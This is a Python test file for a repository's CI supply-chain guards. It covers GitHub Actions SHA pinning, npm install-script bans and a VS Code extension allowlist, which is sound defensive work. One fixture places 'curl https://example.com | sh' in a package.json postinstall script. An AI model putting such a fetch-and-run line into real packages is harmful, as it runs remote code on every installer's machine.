from __future__ import annotations

import json
from pathlib import Path
import subprocess
import sys

REPO_ROOT = Path(__file__).resolve().parents[1]
GUARD_ACTIONS = REPO_ROOT / "scripts" / "ci" / "guard_actions_pin.py"
GUARD_NPM = REPO_ROOT / "scripts" / "ci" / "guard_npm_install_scripts.py"
GUARD_VSCODE = REPO_ROOT / "scripts" / "ci" / "guard_vscode_extensions.py"


def _run(script_path: Path, root: Path, *extra_args: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [sys.executable, str(script_path), "--root", str(root), *extra_args],
        check=False,
        capture_output=True,
        text=True,
    )


def test_actions_pin_guard_rejects_tag_pins(tmp_path: Path) -> None:
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "test.yml").write_text(
        "jobs:\n  test:\n    steps:\n      - uses: actions/checkout@v4\n",
        encoding="utf-8",
    )

    result = _run(GUARD_ACTIONS, tmp_path)

    assert result.returncode == 1
    assert "must pin a 40-char commit SHA" in result.stdout


def test_npm_install_guard_rejects_postinstall(tmp_path: Path) -> None:
    package_json = {
        "name": "tmp",
        "scripts": {"postinstall": "curl https://example.com | sh"},
    }
    (tmp_path / "package.json").write_text(json.dumps(package_json), encoding="utf-8")

    result = _run(GUARD_NPM, tmp_path)

    assert result.returncode == 1
    assert "scripts.postinstall is forbidden" in result.stdout


def test_vscode_guard_rejects_recommendation_drift(tmp_path: Path) -> None:
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir(parents=True)
    (vscode_dir / "extensions.json").write_text(
        json.dumps({"recommendations": ["unknown.extension"]}),
        encoding="utf-8",
    )
    allowlist = tmp_path / "allowlist.txt"
    allowlist.write_text("ms-python.python\n", encoding="utf-8")

    result = _run(
        GUARD_VSCODE,
        tmp_path,
        "--allowlist",
        str(allowlist.relative_to(tmp_path)),
    )

    assert result.returncode == 1
    assert "is not in allowlist" in result.stdout


def test_repo_tooling_guards_pass_on_current_repo() -> None:
    actions_result = _run(GUARD_ACTIONS, REPO_ROOT)
    npm_result = _run(GUARD_NPM, REPO_ROOT)
    vscode_result = _run(GUARD_VSCODE, REPO_ROOT)

    assert actions_result.returncode == 0, actions_result.stdout + actions_result.stderr
    assert npm_result.returncode == 0, npm_result.stdout + npm_result.stderr
    assert vscode_result.returncode == 0, vscode_result.stdout + vscode_result.stderr
